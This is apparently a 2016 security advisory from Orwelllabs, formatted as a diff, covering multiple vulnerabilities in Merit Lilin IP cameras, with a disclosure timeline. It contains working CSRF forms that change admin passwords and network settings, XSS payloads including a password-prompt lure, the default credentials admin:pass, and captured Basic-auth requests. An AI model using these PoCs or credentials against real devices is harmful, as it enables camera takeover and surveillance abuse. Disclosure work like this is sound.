@@ -1,0 +1,389 @@
+  _   _   _   _   _   _   _   _   _   _
+ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \
+( 0 | R | W | 3 | L | L | L | 4 | 8 | 5 )
+ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/
+
+     www.orwelllabs.com
+                      securityadivisory
+@orwelllabs
+   ;)(r
+
+
+By sitting in the alcove, and keeping well back,
+Winston was able to remain outside the range of the telescreen...
+
+
+* Adivisory Information
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+(+) Title: Merit Lilin IP Cameras Multiple Vulnerabilities
+(+) Vendor: Merit Lilin Enterprise Co., Ltd.
+(+) Research and Advisory: Orwelllabs
+(+) Adivisory URL:
+http://www.orwelllabs.com/2016/04/merit-lilin-ip-cameras-multiple_27.html
+(+) OLSA-ID: OLSA-2016-04-28
+(+) Affected Versions: L series products with firmware 1.4.36/1.2.02, OS
+Version: Linux 2.6.38/Linux 2.6.32
+(+) IoT Attack Surface: Device Administrative
+Interface/Authentication/Authorization
+(+) Owasp IoTTop10: I1, I2
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+* Adivisory Overview
+--+---------------------------------------------+------+--------------------------------------------
+id|         Vulnerability Title               | Rank |      Attack Surface
+--+---------------------------------------------+------+--------------------------------------------
+1 | Multiple Cross-site Request Forgery |  I1  | Insecure Web Interfaces
+2 | Multiple Cross-site Scripting/HTML Injection|  I1  | Insecure Web
+Interfaces
+3 | Hard-coded credentials   |  I1  | Insecure Web Interfaces
+4 | Cleartext sensitive data   |  I1  | Insecure Web Interfaces
+5 | Weak Passwords/Known credentials       |  I1  | Insecure Web Interfaces
+6 | Account lockout   |  I1  | Insecure Web Interfaces
+7 | Poorly Protected Credentials     |  I2  | Insufficient
+Authentication/Authorization
+--+---------------------------------------------+------+--------------------------------------------
+
+
+Vendor Background
+=================
+LILIN, is a global IP video manufacturer of IP video cameras, recording
+devices, and software with over 30 years of experience.
+
+
+1. Multiple Cross-site Request Forgery
+======================================
+Merit LILIN IP Cameras are prone to multiple cross-site request forgery
+vulnerabilities.
+
+
+(+) Technical Details and PoCs:
+-------------------------------
+# Basic >> System >> User
+
+> Changing 'admin' password to 'w!nst0nSm!th'
+
+<html>
+  <!-- Orwelllabs - Merit Lilin IP Camera - CSRF PoC -->
+  <body>
+    <form action="
+http://xxx.xxx.xxx.xxx/apply2.cgi?action=useredit&user_seq=1&user_account=admin&user_password=w!nst0nSm!th&user_priority=254&user_group=0
+">
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+# Basic >> Network >> DDNS
+> change DDNS information (user/hostname/password)
+
+<html>
+  <!-- Orwelllabs - Merit Lilin IP Camera - CSRF PoC -->
+  <body>
+    <form action="
+http://xxx.xxx.xxx.xxx/apply.cgi?action=ddns_apply&next_page=ddns.asp&ddns_type=0&ddns_flag=1&ddns_account=Winston&ddns_pwd=pass&ddns_hostname=smithwmachine&ddns_new_pwd=&ddns_wanip=
+">
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
+# SNMP
+> change community/user/pass/pripass/v3rouser/etc.
+
+<html>
+  <!-- Orwelllabs - Merit Lilin IP Camera - CSRF PoC -->
+  <body>
+    <form action="
+http://xxx.xxx.xxx.xxx/snmp?snmpenable=0&v12rwcommunity=public&v12rocommunity=private&v3user=admin&v3authpass=password&v3pripass=w!nst0nSm!th&v3rwuser=public&v3rouser=private
+">
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
+# Basic >> Network >> SIP
+> change sip_domain_server/sipreg_username/sipreg_password/sip_port=/etc.
+
+<html>
+  <!-- Orwelllabs - Merit Lilin IP Camera - CSRF PoC -->
+  <body>
+    <form action="
+http://xxx.xxx.xxx.xxx/apply.cgi?action=sip_apply&next_page=sip.asp&voip_flag=1&sip_domain_server=lilintw.ddnsipcam.com&sipreg_username=admin&sipreg_password=pass&sipreg_expires=0&sip_port=5060&audiortp_port=7078&videortp_port=9078
+">
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
+
+2. Multiple Cross-site Scripting/HTML Injection
+====================-==========================
+Merit Lilin IP Cameras are prone to multiple cross-site scripting
+vulnerabilities.
+
+Technical Details and PoCs:
+---------------------------
+
+[SAMBA] Advance >> System >> SAMBA Service
+------------------------------------------
+%- Script: apply.cgi
+%- affected parameters:
+
+(+) action
+(+) SambaRecordState
+(+) SAMBA_OSD
+(+) SAMBARecordOption2
+(+) SAMBARecordFormat
+(+) SAMBAPreRecordTime
+(+) SAMBAServer
+(+) SAMBAServerPort
+(+) SAMBAServerAccount
+(+) SAMBAServerPassword
+(+) SAMBAServerDirectory
+
+%- [ *** XSS *** ] Payload(1) used:
+123%3Cimg%20src=%22x%20%22%20onerror=prompt%28%22Lilin_Password:%22%29%20/%3E
+
+%- URL: http://xxx.xxx.xxx.xxx/apply.cgi?action=[ *** XSS ***
+]&SambaRecordState=[ *** XSS *** ]&SAMBA_OSD=[ *** XSS ***
+]&SAMBARecordOption2=[ *** XSS *** ]&SAMBARecordFormat=[ *** XSS ***
+]&SAMBAPreRecordTime=[ *** XSS *** ]&SAMBAServer=[ *** XSS ***
+]&SAMBAServerPort=[ *** XSS *** ]&SAMBAServerAccount=[ *** XSS ***
+]&SAMBAServerPassword=[ *** XSS *** ]&SAMBAServerDirectory=[ *** XSS *** ]
+
+
+[General] -> Basic >> System >> General
+---------------------------------------
+- Affected script: apply.cgi
+- affected parameters:
+
+(+) action
+(+) next_page
+(+) SAMBAServerDirectory
+
+%- [ *** XSS *** ] Payload(2) used:
+%22%3E%3Cscript%3Ealert%281%29%3C/script%3E
+
+%- URL http://xxx.xxx.xxx.xxx/apply.cgi?action=[ *** XSS *** ]&next_page=[
+*** XSS ***
+]&CAM_NAME=LR6122&ACTIVEX_OSD_NAME=LR6122&CAM_OSD=0&TIMER_OSD=0&ACTIVEX_OSD_ENABLE=0&ACTIVEX_MODE=0
+
+
+[HTTP POST Service] -> Advance >> Event >> HTTP POST Service
+------------------------------------------------------------
+- Affected script: apply.cgi
+- affected parameters:
+
+(+) AM_HTTP_JPEG
+(+) next_page*-*
+(+) HTTPPostPort*-*
+
+%- [ *** XSS *** ] Payload used:
+123%3Cimg%20src=%22x%20%22%20onerror=prompt%28%22Lilin_Password:%22%29%20/%3E
+*-* Payload(2)
+
+%- URL:
+http://xxx.xxx.xxx.xxx/apply.cgi?action=httppost_apply&next_page=httppost.asp&HTTPServer=192.168.0.2&HTTPPostPort=56082&HTTPAccount=LILIN&HTTPPassword=control4&AM_HTTP_JPEG=[
+*** XSS *** ]
+
+
+3. Hard-coded credentials
+=========================
+This application stores hard-coded credentials in html code.
+
+Technical Details and PoCs:
+---------------------------
+
+(+) GET -> http://xxx.xxx.xxx.xxx/new/index.htm
+HTML Source code:
+
+<script>
+var g_ScreenMode = GetCookie('ScreenMode');
+if(g_ScreenMode==null || g_ScreenMode=='' || g_ScreenMode==' ')
+{
+g_ScreenMode = 1;
+SetCookie('ScreenMode', 1);
+}
+var g_AD_OSD_FLAG = GV('0','0');
+//Profileno,Width,Height,Type,ScreenSwitch,Resolution,Cmd
+var g_CtrlInfo = new Ctrl_ProfileInfo('',0,0,'',g_ScreenMode,'','');
+var g_AD_RATE = Number('0');
+var g_video_port = Number('0');
+var g_spook_port = Number('554');
+var g_httpd_auth_account = 'admin'; <<<<<---- user
+var g_httpd_auth_passwd  = 'pass'; <<<<<---- pass
+var g_encode_mode = Number('0');
+var g_profile00_fps_dwell = 1000/Number('15');
+var g_profile01_fps_dwell = 1000/Number('5');
+var g_profile02_fps_dwell = 1000/Number('25');
+var g_profile03_fps_dwell = 1000/Number('0');
+var g_ACTIVEX_OSD_ENABLE = Number('0');
+var g_title_name = 'LR6122';
+var g_CAM_OSD = Number('0');
+var g_TIMER_OSD = Number('0');
+
+     [... Snip ...]
+
+
+(+) GET -> http://xxx.xxx.xxx.xxx/new/no_sd_file.htm
+HTML source code:
+
+[... Snip ...]
+//http://192.168.3.162/sdlist?dirlist=0
+//http://192.168.3.225/sdlist?filelist=2012081001
+//var g_AllDir =
+"2012080901,2012080902,2012080903,2012080904,2012080905,2012080906:2012081001,2012081002:2012081101,2012081111";
+//var g_AllFiles =
+"20120809010124.avi,20120809010234.avi,20120809010334.avi,20120809010434.avi,20120809010534.avi,20120809010643.avi";
+var g_httpd_auth_account = GV('admin','admin'); <<<<<---- here
+var g_httpd_auth_passwd = GV('pass','pass');     <<<<<---- here
+[... Snip ...]
+
+
+4. Cleartext sensitive data
+===========================
+Everything is trasmite over HTTP, including credentials,
+like this, when an administrador "submmit" the Samba configuration form
+(cleartext everywhere).
+
+Technical Details and PoCs:
+---------------------------
+
+GET
+/apply.cgi?action=sambarec_apply&SambaRecordState=0&SAMBA_OSD=0&SAMBARecordOption2=0&SAMBARecordFormat=0&SAMBAPreRecordTime=5&SAMBAServer=192.168.0.100&SAMBAServerPort=5000&SAMBAServerAccount=admin&SAMBAServerPassword=pass&SAMBAServerDirectory=/Public
+HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Authorization: Basic YWRtaW46cGFzcw==
+Connection: keep-alive
+
+
+5. Weak Default Credentials/Known credentials
+=============================================
+The vast maiority of these devices remain with default credential
+admin:pass (cameras)/admin:1111 (NVR) and costumers are not obligated to
+change it during initial setup. The best
+
+6. Account Lockout
+==================
+There is no control to prevent brute force attacks and to lockout an
+account after X failed login attempts.
+
+I1.Impact
+---------
+Insecure web interfaces can result in data loss or corruption, lack of
+accountability, or denial of access and can lead to complete device
+takeover.
+
+
+7. Poorly Protected Credentials
+===============================
+An attacker in the same network is able to capture and decode the
+credentials as they aren't trasmited over HTTPs and are protected using
+just Base64 encoding.
+
+Technical Details and PoCs:
+---------------------------
+
+> GET Request of) Authentication Process
+
+GET /new/setup.htm HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: O|orwell/labs,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://xxx.xxx.xxx.xxx/new/setup.htm
+Cookie: lang=0; ScreenMode=O-Orw3lll@bs; profileno=0; uimode=1
+Connection: keep-alive
+Authorization: Basic YWRtaW46cGFzcw==
+
+
+Affected products
+=================
+L series with firmware 1.4.36/1.2.02, OS Version: Linux 2.6.38/Linux 2.6.32.
+
+LB1022X
+LR7224X
+LR7228X
+LR7424X
+LR7428X
+LR7722X
+LR7022
+LR7922
+LR6122X
+LR6022X
+LR2322X
+LR2122
+LR312
+LR832
+LR2522
+LD6122X
+LD2322X
+LD2122
+LD2222
+
+*Once this is related with a old bad design its probably that a large range
+of products are affected by reported issues.
+
+
+Timeline
+++++++++
+2016-03-23: First attemp to contact Vendor
+2016-04-22: Request #13617 "Lilin Products Vulnerabilities" created
+2016-04-23: Attemp to contact vendor
+2016-04-25: Vendor response (ask for details)
+2016-04-27: According to the Vendor these issues are already know and will
+be remediated in the future.
+2016-04-28: Full disclosure
+
+
+About Orwelllabs
+++++++++++++++++
+Orwelllabs is an independent security research lab interested in IoT, what
+means embedded devices and all its components like web applications, network,
+mobile applications and all surface areas prone to attack. Orwelllabs aims
+to study, learn and produce some intelligence around this vast and
+confusing big picture called smart cities. We have special appreciation for
+devices designed to provide security to these highly technological cities,
+also known as Iost (Internet of Things Security).
+
+
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+mQENBFcJl8wBCAC/J8rAQdOoC82gik6LVbH674HnxAAQ6rBdELkyR2S2g1zMIAFt
+xNN//A3bUWwFtlrfgiJkiOC86FimPus5O/c4iZc8klm07hxWuzoLPzBPM50+uGKH
+xZwwLa5PLuuR1T0O+OFqd9sdltz6djaYrFsdq6DZHVrp31P7LqHHRVwN8vzqWmSf
+55hDGNTrjbnmfuAgQDrjA6FA2i6AWSTXEuDd5NjCN8jCorCczDeLXTY5HuJDb2GY
+U9H5kjbgX/n3/UvQpUOEQ5JgW1QoqidP8ZwsMcK5pCtr9Ocm+MWEN2tuRcQq3y5I
+SRuBk/FPhVVnx5ZrLveClCgefYdqqHi9owUTABEBAAG0IU9yd2VsbExhYnMgPG9y
+d2VsbGxhYnNAZ21haWwuY29tPokBOQQTAQgAIwUCVwmXzAIbAwcLCQgHAwIBBhUI
+AgkKCwQWAgMBAh4BAheAAAoJELs081R5pszAhGoIALxa6tCCUoQeksHfR5ixEHhA
+Zrx+i3ZopI2ZqQyxKwbnqXP87lagjSaZUk4/NkB/rWMe5ed4bHLROf0PAOYAQstE
+f5Nx2tjK7uKOw+SrnnFP08MGBQqJDu8rFmfjBsX2nIo2BgowfFC5XfDl+41cMy9n
+pVVK9qHDp9aBSd3gMc90nalSQTI/QwZ6ywvg+5/mG2iidSsePlfg5d+BzQoc6SpW
+LUTJY0RBS0Gsg88XihT58wnX3KhucxVx9RnhainuhH23tPdfPkuEDQqEM/hTVlmN
+95rV1waD4+86IWG3Zvx79kbBnctD/e9KGvaeB47mvNPJ3L3r1/tT3AQE+Vv1q965
+AQ0EVwmXzAEIAKgsUvquy3q8gZ6/t6J+VR7ed8QxZ7z7LauHvqajpipFV83PnVWf
+ulaAIazUyy1XWn80bVnQ227fOJj5VqscfnHqBvXnYNjGLCNMRix5kjD/gJ/0pm0U
+gqcrowSUFSJNTGk5b7Axdpz4ZyZFzXc33R4Wvkg/SAvLleU40S2wayCX+QpwxlMm
+tnBExzgetRyNN5XENATfr87CSuAaS/CGfpV5reSoX1uOkALaQjjM2ADkuUWDp6KK
+6L90h8vFLUCs+++ITWU9TA1FZxqTl6n/OnyC0ufUmvI4hIuQV3nxwFnBj1Q/sxHc
+TbVSFcGqz2U8W9ka3sFuTQrkPIycfoOAbg0AEQEAAYkBHwQYAQgACQUCVwmXzAIb
+DAAKCRC7NPNUeabMwLE8B/91F99flUVEpHdvy632H6lt2WTrtPl4ELUy04jsKC30
+MDnsfEjXDYMk1GCqmXwJnztwEnTP17YO8N7/EY4xTgpQxUwjlpah++51JfXO58Sf
+Os5lBcar8e82m1u7NaCN2EKGNEaNC1EbgUw78ylHU3B0Bb/frKQCEd60/Bkv0h4q
+FoPujMQr0anKWJCz5NILOShdeOWXIjBWxikhXFOUgsUBYgJjCh2b9SqwQ2UXjFsU
+I0gn7SsgP0uDV7spWv/ef90JYPpAQ4/tEK6ew8yYTJ/omudsGLt4vl565ArKcGwB
+C0O2PBppCrHnjzck1xxVdHZFyIgWiiAmRyV83CiOfg37
+=IZYl
+-----END PGP PUBLIC KEY BLOCK-----
